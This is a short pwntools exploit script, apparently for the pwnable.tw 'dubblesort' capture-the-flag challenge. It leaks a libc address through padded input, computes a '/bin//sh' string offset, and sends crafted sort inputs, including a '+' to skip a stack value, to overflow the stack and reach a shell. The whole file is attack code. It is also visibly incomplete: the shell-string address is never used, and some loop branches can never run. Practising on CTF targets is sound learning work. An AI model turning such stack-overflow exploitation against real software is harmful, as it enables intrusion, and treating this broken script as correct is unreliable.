from pwn import *
import sys,os
context.arch = 'i386'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('chall.pwnable.tw',10101)
else:
    r = remote('localhost',8888)
print os.getpid()+6
pad = 'x'*25
r.send(pad)
r.recvuntil('Hello ' + pad)
info = r.recv(3)
libc = u32(info.rjust(4,'\0'))
#dubblesort
print hex(libc)

#/bin//sh string
sh_addr = libc + 0x158e8b
num = 32 + 1
r.recvuntil('How many numbers do you what to sort')
r.sendline(str(num))
for i in range(num-1):
    if i == 24:
        msg = '+'
    elif i == 32:
        msg = '0xffffffff'
    else:
        msg = str(i)
    r.recvuntil('Enter')
    if i != num-1:
        r.sendline(msg)
    else:
        r.interactive()
        r.sendline(msg)
r.interactive()

